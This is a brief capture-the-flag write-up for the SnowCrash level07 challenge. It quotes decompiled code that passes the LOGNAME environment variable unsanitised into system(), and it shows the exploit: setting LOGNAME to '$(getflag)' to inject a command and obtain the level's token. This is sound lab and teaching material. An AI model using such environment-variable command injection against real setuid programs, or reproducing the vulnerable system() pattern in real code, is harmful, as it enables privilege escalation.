# level07

This one has been quite simple, with a ls we saw an exectuable file, and we used Ghidra that gave us the result stored in level07.c in resources folder.

This is the interesting part: 

```
pcVar1 = getenv("LOGNAME");
asprintf(&local_1c,"/bin/echo %s ",pcVar1);
iVar2 = system(local_1c);
```

We just need to change our env with : export LOGNAME='$(getflag)' and we get :

```
/*********************************************************\

level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

\*********************************************************/
```